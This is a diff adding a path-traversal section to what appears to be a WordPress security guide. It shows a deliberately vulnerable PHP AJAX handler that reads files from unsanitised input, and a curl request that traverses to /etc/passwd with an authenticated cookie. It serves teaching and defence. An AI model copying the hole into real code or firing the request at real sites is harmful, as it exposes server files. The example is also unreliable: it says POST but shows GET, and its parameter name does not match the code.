@@ -70,3 +70,28 @@ Below are some of the findings related to Arbitrary File Read:
 
 - [Critical Vulnerabilities Patched in WordPress Automatic Plugin](https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin/)
 
+## Path Traversal
+
+Path traversal is a vulnerability that allows attackers to access files outside the intended directory by traversing file paths. A path traversal can be utilized to exploit the arbitrary file read in case the file read is limited to a specific directory.
+
+
+## Example Cases
+
+Below is an example of vulnerable code:
+
+```php
+add_action("wp_ajax_get_file_of_a_directory", "get_file_of_a_directory");
+
+public function get_file_of_a_directory(){
+
+    $file = $_GET["file"];
+    $file_content = file_get_contents(get_template_directory(). $file);
+    echo $file_content;
+}
+```
+
+To exploit this, any authenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint. The value of the `$_GET['file']` should be traversed backwards using `/../../` to access the files in other directory.
+
+```bash
+curl '<WORDPRESS_BASE_URL/wp-admin/admin-ajax.php?action=get_file_of_a_directory&url=/../../../../../../../etc/passwd' -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
+```
